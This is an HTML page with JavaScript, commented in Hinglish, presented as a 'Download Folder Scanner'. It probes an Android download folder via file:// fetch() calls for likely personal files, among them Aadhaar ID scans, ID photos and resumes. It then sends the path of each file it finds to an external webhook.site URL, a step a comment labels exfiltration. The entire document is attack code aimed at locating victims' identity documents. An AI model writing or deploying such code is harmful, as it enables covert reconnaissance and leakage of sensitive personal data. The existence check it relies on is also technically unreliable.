<!DOCTYPE html>
<html>
<head>
    <title>Download Folder Scanner</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        .file-list { border: 1px solid #333; padding: 10px; margin-top: 10px; min-height: 100px; }
        .found { color: #ffff00; font-weight: bold; }
        button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; }
    </style>
</head>
<body>

    <h3>Download Folder Scanner (Discovery)</h3>
    <p>Target: <code>/storage/emulated/0/Download/</code></p>
    
    <button onclick="scanDownloads()">Start Discovery Scan</button>
    
    <div class="file-list" id="output">Scanning logs will appear here...</div>

    <script>
        const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
        const basePath = "file:///storage/emulated/0/Download/";
        
        // Common file names jo log Download mein rakhte hain
        const commonFiles = [
            "about.jpg", "id.jpg", "aadhaar.pdf", "resume.pdf", 
            "test.txt", "download.jpg", "document.pdf", "image.png"
        ];

        function log(msg, isFound = false) {
            const out = document.getElementById('output');
            const span = document.createElement('div');
            if(isFound) span.className = "found";
            span.innerHTML = "> " + msg;
            out.appendChild(span);
        }

        async function scanDownloads() {
            log("Starting scan on " + basePath + "...");
            
            for (let fileName of commonFiles) {
                const fullPath = basePath + fileName;
                
                // Method: fetch() se check karna ki file exists ya nahi
                try {
                    let response = await fetch(fullPath, { mode: 'no-cors' });
                    // Agar fetch block nahi hua, toh file exists
                    log("FOUND: " + fileName, true);
                    
                    // Exfiltrate success to webhook
                    fetch(webhook + "?found_file=" + btoa(fullPath));
                } catch (e) {
                    log("Checked: " + fileName + " (Not accessible or missing)");
                }
            }
            log("Scan complete.");
        }
    </script>
</body>
</html>
